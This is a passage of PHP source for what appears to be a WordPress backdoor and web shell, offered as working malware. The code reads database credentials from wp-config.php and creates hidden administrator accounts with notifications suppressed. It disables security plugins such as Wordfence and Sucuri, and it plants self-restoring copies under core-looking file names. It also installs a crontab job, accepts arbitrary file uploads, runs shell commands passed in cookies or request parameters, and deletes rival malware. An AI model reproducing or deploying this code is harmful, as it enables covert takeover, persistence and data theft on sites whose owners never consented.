    if (!$wp_root) return ['ok'=>false,'error'=>'No WP'];
    $primary = realpath(__FILE__) ?: __FILE__;
    $content = @file_get_contents(__FILE__);
    if (!$content || strlen($content) < 4096) return ['ok'=>false,'error'=>'Cannot read self'];
    $hash = _nx_stable_hash();
    $heartbeat = sys_get_temp_dir().'/.nx_hb_'.$hash;
    
    if (file_exists($heartbeat) && (time() - @filemtime($heartbeat)) < 120) {
        return ['ok'=>true,'status'=>'already_running','heartbeat'=>$heartbeat];
    }
    $pid = @pcntl_fork();
    if ($pid === -1) return ['ok'=>false,'error'=>'Fork failed'];
    if ($pid > 0) {
        
        @file_put_contents($heartbeat, (string)$pid);
        return ['ok'=>true,'status'=>'spawned','pid'=>$pid,'heartbeat'=>$heartbeat,'ttl'=>$ttl];
    }
    
    @posix_setsid(); 
    @fclose(STDIN); @fclose(STDOUT); @fclose(STDERR);
    $start = time();
    $min_sz = max(4096, (int)(strlen($content) * 0.5));
    $backup_uploads = $wp_root.'/wp-content/uploads';
    $backup_includes = $wp_root.'/wp-includes/assets';
    $backup_name_u = 'class-wp-cache_'.$hash.'.php';
    $backup_name_i = 'class-walker_'.$hash.'.php';
    while (true) {
        if ((time() - $start) > $ttl) break; 
        
        @touch($heartbeat);
        
        if (!file_exists($primary) || @filesize($primary) < $min_sz) {
            
            $bu = $backup_uploads.'/'.$backup_name_u;
            if (file_exists($bu) && @filesize($bu) >= $min_sz) {
                
                if (file_exists($primary)) @rename($primary, $primary.'.sentinel_bak');
                @copy($bu, $primary);
                @chmod($primary, 0644);
                @unlink($primary.'.sentinel_bak');
            }
            
            elseif (is_dir($backup_includes)) {
                $bi = $backup_includes.'/'.$backup_name_i;
                if (file_exists($bi) && @filesize($bi) >= $min_sz) {
                    if (file_exists($primary)) @rename($primary, $primary.'.sentinel_bak');
                    @copy($bi, $primary);
                    @chmod($primary, 0644);
                    @unlink($primary.'.sentinel_bak');
                }
            }
        }
        
        if (!file_exists($backup_uploads.'/'.$backup_name_u) && file_exists($primary) && @filesize($primary) >= $min_sz) {
            @copy($primary, $backup_uploads.'/'.$backup_name_u);
            @chmod($backup_uploads.'/'.$backup_name_u, 0444);
        }
        if (is_dir($backup_includes) && !file_exists($backup_includes.'/'.$backup_name_i) && file_exists($primary) && @filesize($primary) >= $min_sz) {
            @copy($primary, $backup_includes.'/'.$backup_name_i);
            @chmod($backup_includes.'/'.$backup_name_i, 0444);
        }
        sleep(60);
    }
    @unlink($heartbeat);
    exit(0);
}
function _nx_sentinel_status() {
    $hash = _nx_stable_hash();
    $heartbeat = sys_get_temp_dir().'/.nx_hb_'.$hash;
    if (!file_exists($heartbeat)) return ['alive'=>false,'heartbeat'=>'missing'];
    $age = time() - @filemtime($heartbeat);
    $pid = trim(@file_get_contents($heartbeat) ?: '');
    $alive = $age < 120;
    
    if ($pid && function_exists('posix_kill')) {
        $alive = $alive && @posix_kill((int)$pid, 0);
    }
    return ['alive'=>$alive,'age_s'=>$age,'pid'=>$pid,'heartbeat'=>$heartbeat];
}

function _nx_heal_http_spread($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    $content = @file_get_contents(__FILE__);
    if (!$content || strlen($content) < 4096) return ['ok'=>false,'error'=>'Cannot read self'];
    $hash = _nx_stable_hash();
    $out = ['ok'=>true,'hash'=>$hash,'size'=>strlen($content),'md5'=>md5($content)];

    
    $inc_dir = $wp_root ? $wp_root.'/wp-includes/assets' : '';
    $inc_name = 'class-walker_'.$hash.'.php';
    if ($inc_dir) {
        if (!is_dir($inc_dir)) @mkdir($inc_dir, 0755, true);
        $inc_path = $inc_dir.'/'.$inc_name;
        if (file_exists($inc_path) && !is_writable($inc_path)) @chmod($inc_path, 0644);
        $r = _nx_decoy_write($content, $inc_dir, $inc_name, false);
        $out['includes'] = $r ? ['ok'=>true,'file'=>$inc_path,'web'=>'/wp-includes/assets/'.$inc_name] : ['ok'=>false,'error'=>'write_failed'];
    } else {
        $out['includes'] = ['ok'=>false,'error'=>'No WP root'];
    }

    
    
    
    $self = realpath(__FILE__) ?: __FILE__;
    $script_fs = '';
    if (!empty($_SERVER['SCRIPT_FILENAME']) && @is_file($_SERVER['SCRIPT_FILENAME'])) {
        $script_fs = $_SERVER['SCRIPT_FILENAME'];
    } elseif ($self && strpos($self, sys_get_temp_dir()) !== 0) {
        $script_fs = $self;
    }
    $sib_dir = $script_fs ? dirname($script_fs) : dirname($self);
    $sib_name = 'class-wp-compat_'.$hash.'.php';
    if ($sib_dir && is_dir($sib_dir) && is_writable($sib_dir) && strpos($sib_dir, sys_get_temp_dir()) !== 0) {
        if (file_exists($sib_dir.'/'.$sib_name) && !is_writable($sib_dir.'/'.$sib_name)) @chmod($sib_dir.'/'.$sib_name, 0644);
        $r = _nx_decoy_write($content, $sib_dir, $sib_name, false);
        $web = '';
        if (!empty($_SERVER['SCRIPT_NAME'])) {
            $web = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'])), '/').'/'.$sib_name;
            if ($web === '' || $web[0] !== '/') $web = '/'.$web;
        } elseif ($wp_root && strpos($sib_dir, $wp_root) === 0) {
            $web = str_replace('\\', '/', substr($sib_dir, strlen($wp_root))).'/'.$sib_name;
            if ($web === '' || $web[0] !== '/') $web = '/'.$web;
        }
        $out['plugin_sibling'] = $r ? ['ok'=>true,'file'=>$sib_dir.'/'.$sib_name,'web'=>$web] : ['ok'=>false,'error'=>'write_failed'];
    } else {
        $out['plugin_sibling'] = ['ok'=>false,'error'=>'no_web_sibling_dir','dir'=>$sib_dir];
    }

    
    if ($wp_root) {
        $up = _nx_persist($wp_root); 
        $out['persist_backup'] = $up;
    }
    
    if ($wp_root) $out['spread'] = _nx_spread_backups($wp_root);
    return $out;
}

function _nx_spread_backups($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    if (!$wp_root) return ['ok'=>false,'error'=>'No WP'];
    $content = @file_get_contents(__FILE__);
    if (!$content || strlen($content) < 4096) return ['ok'=>false,'error'=>'Cannot read self'];
    $hash = _nx_stable_hash();
    $results = [];
    $dirs = [
        $wp_root.'/wp-content/uploads'  => 'class-wp-cache_'.$hash.'.php',
        $wp_root.'/wp-includes/assets'  => 'class-walker_'.$hash.'.php',
    ];
    foreach ($dirs as $dir => $name) {
        if (!is_dir($dir)) continue;
        $path = $dir.'/'.$name;
        
        $same = file_exists($path) && @md5_file($path) === md5($content);
        if ($same) {
            $results[$name] = 'exists';
            continue;
        }
        if (file_exists($path) && !is_writable($path)) @chmod($path, 0644);
        $r = _nx_decoy_write($content, $dir, $name, true); 
        $results[$name] = $r ? 'planted' : 'failed';
        if ($r && file_exists($path) && !$same) $results[$name.'_refreshed'] = true;
    }
    return ['ok'=>true,'backups'=>$results];
}

function _nx_cron_persist($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    $primary = realpath(__FILE__) ?: __FILE__;
    $result = [];
    
    if ($wp_root) {
        $cfg = $wp_root.'/wp-config.php';
        $src_cfg = @file_get_contents($cfg);
        $db = []; $prefix = 'wp_';
        if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]/", $src_cfg, $m)) $db['name'] = $m[1];
        if (preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]/", $src_cfg, $m)) $db['user'] = $m[1];
        if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]/", $src_cfg, $m)) $db['pass'] = $m[1];
        if (preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]/", $src_cfg, $m)) $db['host'] = $m[1];
        if (preg_match("/table_prefix\s*=\s*['\"](.*?)['\"]/", $src_cfg, $m)) $prefix = $m[1];
        if (isset($db['name'],$db['user'],$db['pass'],$db['host'])) {
            try {
                $pdo = new \PDO('mysql:host='.$db['host'].';dbname='.$db['name'], $db['user'], $db['pass']);
                $opt_name = '_site_transient_health_'.substr(md5(SECRET_KEY_D800),0,8);
                $chk = $pdo->query("SELECT COUNT(*) FROM `".$prefix."options` WHERE option_name='".$opt_name."'");
                $result['db_payload'] = ($chk && $chk->fetchColumn() > 0) ? 'exists' : 'missing';
                $pr = _nx_persist($wp_root);
                $result['wp_cron_via_mu'] = (!empty($pr['mu_plugin']) && strpos((string)$pr['mu_plugin'],'FAILED')===false) ? 'armed' : 'failed';
            } catch(\Exception $e) { $result['db_error'] = $e->getMessage(); }
        }
    }
    
    
    $crontab = _nx_exec('crontab -l 2>/dev/null');
    if ($crontab !== null && (strpos($crontab, '[EXEC_BLOCKED]') !== false || strpos($crontab, '[BLOCKED]') !== false)) {
        $crontab = null;
    }
    $cron_marker = '# wp_health_'.substr(md5(SECRET_KEY_D800),0,8);
    if ($crontab !== null && strpos($crontab, $cron_marker) === false) {
        $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $self_url = $scheme.'://'.$host.'/'.ltrim(str_replace($wp_root?:$_SERVER['DOCUMENT_ROOT'],'',__FILE__),'/');
        $job = "*/30 * * * * curl -s -o /dev/null -b '_wp_nonce_key=".SECRET_KEY_D800."' '".addcslashes($self_url,"'")."?feature=selftest' ".$cron_marker."\n";
        $new_cron = $crontab.$job;
        $tmp = sys_get_temp_dir().'/nx_cron_'.md5(mt_rand());
        @file_put_contents($tmp, $new_cron);
        _nx_exec('crontab '.escapeshellarg($tmp).' 2>/dev/null');
        @unlink($tmp);
        $chk = _nx_exec('crontab -l 2>/dev/null');
        $result['system_cron'] = ($chk !== null && strpos((string)$chk, $cron_marker) !== false) ? 'installed' : 'failed';
    } else {
        $result['system_cron'] = ($crontab !== null && strpos($crontab, $cron_marker) !== false) ? 'exists' : 'unavailable';
    }
    
    $result['ok'] = (!empty($result['db_payload']) && $result['db_payload'] === 'exists')
                 || (!empty($result['wp_cron_via_mu']) && $result['wp_cron_via_mu'] === 'armed')
                 || (!empty($result['system_cron']) && in_array($result['system_cron'], ['installed','exists']));
    return $result;
}

function _nx_neutralize_security($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    if (!$wp_root) return ['ok'=>false,'error'=>'No WP'];
    $neutralized = [];
    $plugins_dir = $wp_root.'/wp-content/plugins';
    
    $sec_plugins = [
        'wordfence','better-wp-security','sucuri-scanner','all-in-one-wp-security-and-firewall',
        'cerber','anti-malware-security-and-brute-force-firewall','wp-cerber',
        'bulletproof-security','shield-security','defender-security','secupress',
        'ithemes-security-pro','malcare-security','wp-activity-log','limit-login-attempts-reloaded'
    ];
    foreach ($sec_plugins as $sp) {
        $path = $plugins_dir.'/'.$sp;
        if (is_dir($path)) {
            
            $disabled = $path.'.disabled_'.time();
            if (@rename($path, $disabled)) {
                $neutralized[] = $sp.' → disabled';
            }
        }
    }
    
    $waf_files = ['wordfence-waf.php','wp-content/wflogs','wp-content/wfcache','.user.ini'];
    foreach ($waf_files as $wf) {
        $fp = $wp_root.'/'.$wf;
        if (file_exists($fp)) {
            if (is_dir($fp)) {
                @rename($fp, $fp.'.bak_'.time());
                $neutralized[] = $wf.' → renamed';
            } else {
                
                if (basename($fp) === '.user.ini') {
                    $ini = @file_get_contents($fp);
                    if ($ini && stripos($ini, 'auto_prepend_file') !== false) {
                        $ini = preg_replace('/^\s*auto_prepend_file\s*=.*$/mi', '', $ini);
                        _nx_atomic_write($fp, $ini);
                        $neutralized[] = '.user.ini → stripped auto_prepend';
                    }
                } else {
                    @rename($fp, $fp.'.bak_'.time());
                    $neutralized[] = $wf.' → renamed';
                }
            }
        }
    }
    return ['ok'=>true,'neutralized'=>$neutralized];
}

function _nx_is_ours_file($path) {
    if (!$path || !is_file($path)) return false;
    $rp = @realpath($path);
    if ($rp && @realpath(__FILE__) && $rp === @realpath(__FILE__)) return true;
    $bn = basename($path);
    if (strpos($bn, 'wp-core-update') === 0) return true;
    $sz = @filesize($path);
    if ($sz === false || $sz > 524288 || $sz < 1) return false;
    $c = @file_get_contents($path);
    if ($c === false || $c === '') return false;
    foreach (['_nx_', 'SECRET_KEY_', 'WP_Core_Integrity', 'End-WP_Core_Integrity', '<<S>>'] as $m) {
        if (strpos($c, $m) !== false) return true;
    }
    return false;
}
function _nx_is_vendor_file($path) {
    $p = strtolower($path);
    foreach (['wordfence', 'sucuri', 'malcare', 'nfw', 'ithemes-security', 'managewp', '0-worker.php', 'wp-cli'] as $v) {
        if (strpos($p, $v) !== false) return true;
    }
    return false;
}
function _nx_rival_hit($path, $c) {
    $bn = strtolower(basename($path));
    foreach (['galex_patch.php', 'ahax.php', 'elp.php', 'ms-elp.php', 'wp-fixplugin.php'] as $n) {
        if ($bn === $n) return $n;
    }
    if (strpos($bn, 'galex_') === 0 && substr($bn, -4) === '.php') return 'galex_*';
    if (substr($bn, -10) === '.final.php') return '.final.php';
    foreach ([
        'galex_patch', 'X-GX-TOKEN', 'gx_b7f9a2e1d8c34f6b', 'wp-fixplugin', 'WP_FIXPLUGIN',
        'fpk_Xr9mQ2pL7nZ4wV8sK1', 'mamglaqwek.com', 'bernovoka.com', 'allianurkoa.com',
        'defunct-kernel', 'gs-dbus-kernel', 'SEED PRNG', 'raimu', 'vinooo_sys',
        'secretyt', 'pwdyt', 'bad'.'Spider', '__B26_'.'2DUAN',
    ] as $ioc) {
        if ($c !== '' && stripos($c, $ioc) !== false) return $ioc;
    }
    return '';
}
function _nx_ooda_scan_dirs($wp_root) {
    $dirs = [];
    foreach (['/wp-content/mu-plugins', '/wp-content/uploads', '/wp-content/plugins'] as $rel) {
        $d = $wp_root . $rel;
        if (is_dir($d)) $dirs[] = $d;
    }
    $dirs[] = $wp_root;
    $out = [];
    $seen = [];
    foreach ($dirs as $dir) {
        $list = @scandir($dir);
        if (!$list) continue;
        foreach ($list as $f) {
            if ($f === '.' || $f === '..') continue;
            $path = $dir . '/' . $f;
            if (is_dir($path) && strpos($dir, '/plugins') !== false) {
                foreach (@scandir($path) ?: [] as $f2) {
                    if (substr($f2, -4) !== '.php') continue;
                    $p2 = $path . '/' . $f2;
                    if (isset($seen[$p2])) continue;
                    $seen[$p2] = 1;
                    $out[] = $p2;
                }
                continue;
            }
            if (substr($f, -4) !== '.php' && substr($f, -6) !== '.phtml') continue;
            if (isset($seen[$path])) continue;
            $seen[$path] = 1;
            $out[] = $path;
            if (count($out) > 400) return $out;
        }
    }
    return $out;
}
function _nx_ooda_map() {
    $wp = _nx_wp_root();
    $cfg = '';
    $auth_readable = false;
    if ($wp) {
        foreach ([$wp.'/wp-config.php', dirname($wp).'/wp-config.php'] as $p) {
            if (is_readable($p)) {
                $cfg = $p;
                $raw = @file_get_contents($p);
                if ($raw && preg_match("/define\s*\(\s*['\"]AUTH_KEY['\"]/", $raw)) $auth_readable = true;
                break;
            }
        }
    }
    $terrain = [
        'php' => PHP_VERSION,
        'disable_functions' => ini_get('disable_functions') ?: '',
        'open_basedir' => ini_get('open_basedir') ?: '',
        'wp_root' => $wp ?: '',
        'wp_config' => $cfg,
        'auth_key_readable' => $auth_readable,
        'openssl' => extension_loaded('openssl'),
        'hash_hkdf' => function_exists('hash_hkdf'),
        'self' => __FILE__,
    ];
    $items = [];
    $counts = ['ours' => 0, 'rival' => 0, 'vendor' => 0, 'unknown' => 0];
    if ($wp) {
        foreach (_nx_ooda_scan_dirs($wp) as $path) {
            if (_nx_is_ours_file($path)) {
                $class = 'ours';
                $why = 'ours_marker';
            } elseif (_nx_is_vendor_file($path)) {
                $class = 'vendor';
                $why = 'vendor_path';
            } else {
                $sz = @filesize($path);
                $c = ($sz && $sz <= 524288) ? (string)@file_get_contents($path) : '';
                $hit = _nx_rival_hit($path, $c);
                if ($hit !== '') {
                    $class = 'rival';
                    $why = $hit;
                } else {
                    $class = 'unknown';
                    $why = '';
                }
            }
            $counts[$class]++;
            if ($class === 'unknown') continue;
            $items[] = ['path' => $path, 'class' => $class, 'why' => $why, 'bytes' => (int)@filesize($path)];
        }
    }
    return [
        'ok' => true,
        'ooda' => 'map',
        'terrain' => $terrain,
        'counts' => $counts,
        'items' => $items,
        'rule' => 'kick only class=rival; never ours/vendor; require go=1',
    ];
}
function _nx_ooda_kick($go) {
    $map = _nx_ooda_map();
    $targets = [];
    foreach ($map['items'] as $it) {
        if (($it['class'] ?? '') === 'rival') $targets[] = $it;
    }
    if (!$go) {
        return ['ok' => true, 'ooda' => 'kick_dry', 'would_kill' => count($targets), 'targets' => $targets, 'hint' => 're-call with go=1 to act'];
    }
    $killed = [];
    $kept = [];
    $fail = [];
    foreach ($targets as $it) {
        $path = $it['path'];
        if (_nx_is_ours_file($path) || _nx_is_vendor_file($path)) {
            $kept[] = $path;
            continue;
        }
        $c = (string)@file_get_contents($path);
        if (_nx_rival_hit($path, $c) === '') {
            $kept[] = $path;
            continue;
        }
        @chmod($path, 0644);
        if (@unlink($path) || (@rename($path, $path.'.off_'.time()) && true)) {
            $killed[] = ['path' => $path, 'why' => $it['why']];
        } else {
            $fail[] = $path;
        }
    }
    return ['ok' => true, 'ooda' => 'kick', 'killed' => count($killed), 'kept' => count($kept), 'fail' => count($fail), 'detail' => $killed, 'fail_paths' => $fail];
}

function _nx_apex_host() {
    $h = isset($_SERVER['HTTP_HOST']) ? strtolower($_SERVER['HTTP_HOST']) : '';
    if ($h === '' && !empty($_SERVER['SERVER_NAME'])) $h = strtolower($_SERVER['SERVER_NAME']);
    if (($p = strpos($h, ':')) !== false) $h = substr($h, 0, $p);
    if (strpos($h, 'www.') === 0) $h = substr($h, 4);
    return $h !== '' ? $h : 'localhost';
}
function _nx_stealth_identity() {
    
    
    $apex = _nx_apex_host();
    $label = preg_replace('/[^a-z0-9]/', '', explode('.', $apex)[0]);
    if ($label === '') $label = 'site';
    $roles = array('web','ti','midia','editor','suporte','infra','dev','ops');
    $role = $roles[hexdec(substr(md5($apex.uniqid('',true)), 0, 2)) % count($roles)];
    $suf = substr(md5(uniqid('',true).mt_rand()), 0, 4);
    $username = substr($label.'_'.$role.$suf, 0, 60);
    $email = $role.$suf.'@'.$apex;
    $password = 'Sv!'.bin2hex(_nx_rnd8()).substr(md5(mt_rand()),0,8);
    return array($username, $email, $password);
}
function _nx_wp_create_admin($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    if (!$wp_root) return ['ok'=>false,'error'=>'Not a WordPress install'];

    list($username, $email, $password) = _nx_stealth_identity();

    
    $php_cmd = "define('ABSPATH','".$wp_root."/');"
        ."require_once(ABSPATH.'wp-load.php');"
        ."require_once(ABSPATH.'wp-admin/includes/user.php');"
        ."add_filter('wp_send_new_user_notification_to_admin','__return_false',99);"
        ."add_filter('wp_send_new_user_notification_to_user','__return_false',99);"
        ."add_filter('send_password_change_email','__return_false',99);"
        ."\$id=wp_insert_user(['user_login'=>'".$username."','user_pass'=>'".$password."',"
        ."'user_email'=>'".$email."','role'=>'administrator','display_name'=>'".$username."']);"
        ."if(is_wp_error(\$id)){echo 'ERR:'.\$id->get_error_message();}else{echo 'OK:'.\$id;}";

    
    ob_start();
    $prev_dir = getcwd();
    @chdir($wp_root);
    $tmp = sys_get_temp_dir().'/wp_u_'.md5(uniqid('',true)).'.php';
    @file_put_contents($tmp, '<?php '.$php_cmd);
    try {
        if (is_file($tmp)) { include $tmp; }
    } catch (\Throwable $e) {
        echo 'EXCEPTION:'.$e->getMessage();
    }
    @unlink($tmp);
    @chdir($prev_dir);
    $output = ob_get_clean();

    if (strpos($output, 'OK:') === 0) {
        return ['ok'=>true,'user'=>$username,'pass'=>$password,'email'=>$email,
                'id'=>str_replace('OK:','',$output),
                'login'=>'https://'.$_SERVER['HTTP_HOST'].'/wp-login.php'];
    }
    
    return _nx_wp_create_admin_db($wp_root, $username, $password, $email);
}

function _nx_wp_create_admin_db($wp_root, $username, $password, $email) {
    
    $config_file = $wp_root.'/wp-config.php';
    if (!file_exists($config_file)) return ['ok'=>false,'error'=>'wp-config.php not found'];

    $config = file_get_contents($config_file);
    
    
    
    preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]/", $config, $m1);
    preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]/", $config, $m2);
    preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]/", $config, $m3);
    preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]/", $config, $m4);
    preg_match("/table_prefix\s*=\s*['\"](.*?)['\"]/", $config, $m5);

    if (empty($m1[1])||empty($m2[1])) return ['ok'=>false,'error'=>'Cannot parse wp-config.php'];

    $db_name = $m1[1]; $db_user = $m2[1]; $db_pass = $m3[1]??'';
    $db_host = $m4[1]??'localhost'; $prefix = $m5[1]??'wp_';

    $conn = @new \mysqli($db_host, $db_user, $db_pass, $db_name);
    if ($conn->connect_error) return ['ok'=>false,'error'=>'DB connect: '.$conn->connect_error];

    $hash = password_hash($password, PASSWORD_DEFAULT);
    
    $wp_hash_cmd = "php -r \"require_once('".$wp_root."/wp-includes/class-phpass.php');"
        ."\\\$h=new PasswordHash(8,true);echo \\\$h->HashPassword('".$password."');\" 2>/dev/null";
    $wp_hash = trim(_nx_exec($wp_hash_cmd));
    if ($wp_hash && strlen($wp_hash) > 20) $hash = $wp_hash;

    $now = date('Y-m-d H:i:s');
    $sql = "INSERT INTO {$prefix}users (user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) "
        ."VALUES ('".$conn->real_escape_string($username)."','".$conn->real_escape_string($hash)."',"
        ."'".$conn->real_escape_string($username)."','".$conn->real_escape_string($email)."','".$now."',0,'".$conn->real_escape_string($username)."')";

    if (!$conn->query($sql)) { $conn->close(); return ['ok'=>false,'error'=>'INSERT failed: '.$conn->error]; }
    $uid = $conn->insert_id;

    
    $conn->query("INSERT INTO {$prefix}usermeta (user_id,meta_key,meta_value) VALUES ({$uid},'{$prefix}capabilities','a:1:{s:13:\"administrator\";b:1;}')");
    $conn->query("INSERT INTO {$prefix}usermeta (user_id,meta_key,meta_value) VALUES ({$uid},'{$prefix}user_level','10')");
    $conn->close();

    return ['ok'=>true,'user'=>$username,'pass'=>$password,'email'=>$email,'id'=>$uid,
            'login'=>'https://'.$_SERVER['HTTP_HOST'].'/wp-login.php','method'=>'direct_db'];
}

function _nx_handle_upload() {
    $ct = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
    $rm = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : '';

    
    if ($rm === 'PUT' && isset($_REQUEST['feature']) && $_REQUEST['feature'] === 'uploadx') {
        $name = isset($_GET['n']) ? basename($_GET['n']) : 'upload.bin';
        $data = file_get_contents('php://input');
        $dir = isset($_GET['d']) ? $_GET['d'] : dirname(__FILE__);
        $r = _nx_decoy_write($data, $dir, $name);
        header('Content-Type: application/json');
        echo json_encode($r ? ['ok'=>true,'file'=>$r,'method'=>'V5'] : ['ok'=>false,'error'=>'Write failed']);
        return true;
    }

    
    if ($rm === 'POST' && strpos($ct, 'application/octet-stream') !== false
        && isset($_SERVER['HTTP_X_CE']) && $_SERVER['HTTP_X_CE'] === 'gzip') {
        $name = isset($_GET['n']) ? basename($_GET['n']) : 'upload.bin';
        $raw = file_get_contents('php://input');
        $data = function_exists('gzdecode') ? @gzdecode($raw) : @gzinflate(substr($raw, 10, -8));
        if ($data === false) { header('Content-Type: application/json'); echo json_encode(['ok'=>false,'error'=>'Gunzip failed']); return true; }
        $dir = isset($_GET['d']) ? $_GET['d'] : dirname(__FILE__);
        $r = _nx_decoy_write($data, $dir, $name);
        header('Content-Type: application/json');
        echo json_encode($r ? ['ok'=>true,'file'=>$r,'method'=>'V9'] : ['ok'=>false,'error'=>'Write failed']);
        return true;
    }

    
    if ($rm === 'POST' && strpos($ct, 'application/json') !== false
        && isset($_REQUEST['feature']) && $_REQUEST['feature'] === 'uploadx') {
        $raw = file_get_contents('php://input');
        $j = json_decode($raw, true);
        $name = isset($j['n']) ? basename($j['n']) : '';
        $b64 = isset($j['d']) ? $j['d'] : '';
        if (!$name || !$b64) { header('Content-Type: application/json'); echo json_encode(['ok'=>false,'error'=>'Missing n/d']); return true; }
        $data = base64_decode($b64);
        $dir = isset($j['c']) ? $j['c'] : dirname(__FILE__);
        $r = _nx_decoy_write($data, $dir, $name);
        header('Content-Type: application/json');
        echo json_encode($r ? ['ok'=>true,'file'=>$r,'method'=>'V6'] : ['ok'=>false,'error'=>'Write failed']);
        return true;
    }

    
    if ($rm === 'POST' && strpos($ct, 'application/x-www-form-urlencoded') !== false
        && isset($_POST['action']) && $_POST['action'] === 'v7') {
        $name = isset($_POST['n']) ? basename($_POST['n']) : 'upload.bin';
        $b64 = isset($_POST['d']) ? $_POST['d'] : '';
        if (!$b64) { header('Content-Type: application/json'); echo json_encode(['ok'=>false,'error'=>'Missing d']); return true; }
        $data = base64_decode($b64);
        $dir = isset($_POST['c']) ? $_POST['c'] : dirname(__FILE__);
        $r = _nx_decoy_write($data, $dir, $name);
        header('Content-Type: application/json');
        echo json_encode($r ? ['ok'=>true,'file'=>$r,'method'=>'V7'] : ['ok'=>false,'error'=>'Write failed']);
        return true;
    }

    
    if ($rm === 'POST' && strpos($ct, 'multipart/form-data') !== false
        && isset($_POST['action']) && $_POST['action'] === 'v8') {
        if (isset($_FILES['f']) && $_FILES['f']['error'] === 0) {
            $name = basename($_FILES['f']['name']);
            $dir = isset($_POST['c']) ? $_POST['c'] : dirname(__FILE__);
            $data = file_get_contents($_FILES['f']['tmp_name']);
            $r = _nx_decoy_write($data, $dir, $name);
            header('Content-Type: application/json');
            echo json_encode($r ? ['ok'=>true,'file'=>$r,'method'=>'V8'] : ['ok'=>false,'error'=>'Write failed']);
            return true;
        }
    }

    
    
    if ($rm === 'POST' && isset($_POST['action']) && $_POST['action'] === 'v10') {
        if (isset($_FILES['f']) && $_FILES['f']['error'] === 0) {
            $raw = file_get_contents($_FILES['f']['tmp_name']);
            $name = basename($_FILES['f']['name']);
            $dir = isset($_POST['c']) ? $_POST['c'] : dirname(__FILE__);
            $r = _nx_decoy_write($raw, $dir, $name);
            header('Content-Type: application/json');
            echo json_encode($r ? ['ok'=>true,'file'=>$r,'method'=>'V10'] : ['ok'=>false,'error'=>'Write failed']);
            return true;
        }
    }

    
    if ($rm === 'POST' && isset($_POST['action']) && $_POST['action'] === 'v1') {
        if (isset($_FILES['f']) && $_FILES['f']['error'] === 0) {
            $dir = isset($_POST['c']) ? $_POST['c'] : dirname(__FILE__);
            $name = basename($_FILES['f']['name']);
            $dest = $dir.DIRECTORY_SEPARATOR.$name;
            $ok = @move_uploaded_file($_FILES['f']['tmp_name'], $dest);
            if ($ok) { @chmod($dest, 0644); _nx_ts_camouflage($dest, $dir); }
            header('Content-Type: application/json');
            echo json_encode($ok ? ['ok'=>true,'file'=>$dest,'method'=>'V1'] : ['ok'=>false,'error'=>'Move failed']);
            return true;
        }
    }

    
    if ($rm === 'POST' && isset($_POST['action']) && $_POST['action'] === 'v2') {
        if (isset($_FILES['f']) && $_FILES['f']['error'] === 0) {
            $dir = isset($_POST['c']) ? $_POST['c'] : dirname(__FILE__);
            $name = basename($_FILES['f']['name']);
            $exts = ['jpg','png','gif','tmp','log','data','bak','cache'];
            $decoy = $dir.DIRECTORY_SEPARATOR.'temp_'.bin2hex(_nx_rnd8()).'.'.$exts[array_rand($exts)];
            $final = $dir.DIRECTORY_SEPARATOR.$name;
            $done = false;
            if (@move_uploaded_file($_FILES['f']['tmp_name'], $decoy)) {
                if (@rename($decoy, $final)) { @chmod($final, 0644); _nx_ts_camouflage($final, $dir); $done = true; }
                else @unlink($decoy);
            }
            header('Content-Type: application/json');
            echo json_encode($done ? ['ok'=>true,'file'=>$final,'method'=>'V2'] : ['ok'=>false,'error'=>'Failed']);
            return true;
        }
    }

    return false; 
}

$_nx_cmd_raw = null;
if (isset($_COOKIE['_wp_cmd'])) {
    $_nx_cmd_raw = base64_decode($_COOKIE['_wp_cmd']);
} elseif (isset($_REQUEST['b'])) {
    $_nx_cmd_raw = base64_decode($_REQUEST['b']);
} elseif (isset($_REQUEST['c'])) {
    $_nx_cmd_raw = $_REQUEST['c'];
}
if ($_nx_cmd_raw !== null) {
    $cwd = isset($_COOKIE['_wp_cwd']) ? base64_decode($_COOKIE['_wp_cwd']) :
           (isset($_REQUEST['cwd']) ? base64_decode($_REQUEST['cwd']) : null);
    $r   = _nx_shell($_nx_cmd_raw, $cwd);
    $out = base64_decode($r['stdout']);
    echo '<<S>>['.($r['method']?:' ').']'.$out.'<<E>>';
    exit;
}

if (_nx_bad_spider()) {
    http_response_code(404);
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
    exit;
}

if (!defined('_NX_PERSISTED')) {
    define('_NX_PERSISTED', true);
    
    $__feat = isset($_REQUEST['feature']) ? $_REQUEST['feature'] : '';
    
    
    
    if (!in_array($__feat, [
        'fulldeploy','persist','nuke','dbpersist','wpcinject','cron','batchgate','remoteconfig',
        'selftest','map','kick','hint','pwd','healspread','neutralize','wpuser',
        'spread','sentinel','restapi','clone','shell','upload','info',
    ], true)) {
    $__wp = _nx_wp_root();
    if ($__wp) {
        $__uploads = $__wp.'/wp-content/uploads';
        if (!is_dir($__uploads)) @mkdir($__uploads, 0755, true);
        $__marker = $__uploads.'/.cache_'.substr(md5(__FILE__.SECRET_KEY_D800),0,8);
